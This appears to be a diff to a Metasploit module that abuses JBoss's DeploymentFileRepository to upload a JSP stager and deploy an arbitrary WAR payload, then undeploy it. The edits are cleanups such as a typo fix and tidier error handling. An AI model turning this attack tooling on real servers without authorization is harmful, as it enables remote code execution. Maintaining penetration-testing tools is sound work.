@@ -13,9 +13,8 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'          => 'JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment',
       'Description' => %q{
-          This module uses the DeploymentFileRepository class in
-        JBoss Application Server (jbossas) to deploy a JSP file
-        which then deploys the WAR file.
+        This module uses the DeploymentFileRepository class in the JBoss Application Server
+        to deploy a JSP file which then deploys an arbitrary WAR file.
       },
       'Author'        =>
         [
@@ -40,8 +39,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new('APPBASE',    [ true,  'Application base name', 'payload']),
-        OptPath.new('WARFILE',      [ false, 'The WAR file to deploy'])
+        OptString.new('APPBASE', [ true,  'Application base name', 'payload']),
+        OptPath.new('WARFILE',   [ false, 'The WAR file to deploy'])
       ], self.class)
   end
 
@@ -55,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status("#{peer} - Deploying stager for the WAR file...")
       res = upload_file(stager_base, stager_jsp_name, stager_contents)
     else
-      print_status("#{peer} - Deploying minmial stager to upload the payload...")
+      print_status("#{peer} - Deploying minimal stager to upload the payload...")
       head_stager_jsp_name = Rex::Text.rand_text_alpha(8+rand(8))
       head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)
       head_stager_uri = "/" + stager_base + "/" + head_stager_jsp_name + ".jsp"
@@ -109,15 +108,18 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+  # Undeploy the WAR and the stager if needed
   def undeploy_action(app_base)
-    # Undeploy the WAR and the stager if needed
     print_status("#{peer} - Undeploying #{app_base} via DeploymentFileRepository.remove()...")
     print_status("This might take some time, be patient...") if http_verb == "HEAD"
     res = delete_file('./', app_base + '.war', '')
 
-    if !res
+    unless res
       print_error("#{peer} - Unable to remove WAR (no response)")
-    elsif res.code < 200 || res.code >= 300
+      return
+    end
+
+    if res.code < 200 || res.code >= 300
       print_error("#{peer} - Unable to remove WAR [#{res.code} #{res.message}]")
     else
       print_good("#{peer} - Successfully removed")
